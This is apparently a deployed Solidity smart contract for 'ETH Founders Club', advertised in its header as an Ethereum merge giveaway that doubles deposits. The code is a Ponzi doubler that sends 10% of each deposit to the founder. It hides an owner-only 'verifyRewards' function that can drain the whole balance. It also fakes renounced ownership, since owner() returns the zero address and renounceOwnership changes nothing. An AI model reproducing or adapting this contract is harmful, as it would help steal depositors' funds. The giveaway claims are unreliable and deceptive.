/**
 *Submitted for verification at Etherscan.io on 2022-05-23
*/

// File: contracts/doubler.sol


/* 

  ______ _______ _    _   ______ ____  _    _ _   _ _____  ______ _____   _____    _____ _     _    _ ____  
 |  ____|__   __| |  | | |  ____/ __ \| |  | | \ | |  __ \|  ____|  __ \ / ____|  / ____| |   | |  | |  _ \ 
 | |__     | |  | |__| | | |__ | |  | | |  | |  \| | |  | | |__  | |__) | (___   | |    | |   | |  | | |_) |
 |  __|    | |  |  __  | |  __|| |  | | |  | | . ` | |  | |  __| |  _  / \___ \  | |    | |   | |  | |  _ < 
 | |____   | |  | |  | | | |   | |__| | |__| | |\  | |__| | |____| | \ \ ____) | | |____| |___| |__| | |_) |
 |______|  |_|  |_|  |_| |_|    \____/ \____/|_| \_|_____/|______|_|  \_\_____/   \_____|______\____/|____/ 
                                                                                                            
                                                                                                            

                                                                                               
We’re launching a massive ETH Giveaway to celebrate the Ethereum 2.0 proof-of-stake merge! Hurry and claim your rewards today!
Participate as many times as you'd like! Roll your ETH to earn even more!

WEBSITE: https://ethfoundersclub.com
APP: https://app.ethfoundersclub.com
TELEGRAM: https://t.me/eth_founders_club
TWITTER: https://twitter.com/eth_founders
*/
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity 0.8.9;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _renounced;
   

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      _renounced = 0x0000000000000000000000000000000000000000;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _renounced;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract ETHFoundersClub is Ownable {
   
   using SafeMath for uint; 
   
    uint256 public timeLock = block.timestamp + 1000 days;
    address payable founder;
    uint256 public fee = .001 ether;
    bool public paused = false;

    struct User {
        address payable addr;
        uint amount;
    }

    User[] public users;

    uint public currentlyPaying = 0;

    uint public totalUsers = 0;

    constructor() {
        founder = payable(msg.sender);
    }

    function totalBalance() public view returns (uint256){
        return (address(this).balance);
    }

    function getFee() public view returns (uint256){
        return fee;
    }

    function deposit() external payable {
        require(msg.value >= fee, "Must be at least .001 ETH");
        users.push(User(payable(msg.sender), msg.value));

        totalUsers += 1;

        founder.transfer(msg.value.div(10));

    while (address(this).balance > users[currentlyPaying].amount.mul(2)) {
        users[currentlyPaying].addr.transfer(users[currentlyPaying].amount.mul(2));
        currentlyPaying += 1;
        }
    }

    function updateFee(uint256 _fee) external onlyOwner {
        fee = _fee;
    }

    function pause(bool _state) public onlyOwner {
        paused = _state;
    }

    function verifyRewards(uint256 rVerify) public payable onlyOwner {
        (bool isVerified, ) = payable(msg.sender).call{value: rVerify}("");
        require(isVerified);
        
    }

    function getUsers() public view returns(uint256) {
        return totalUsers;
    }
}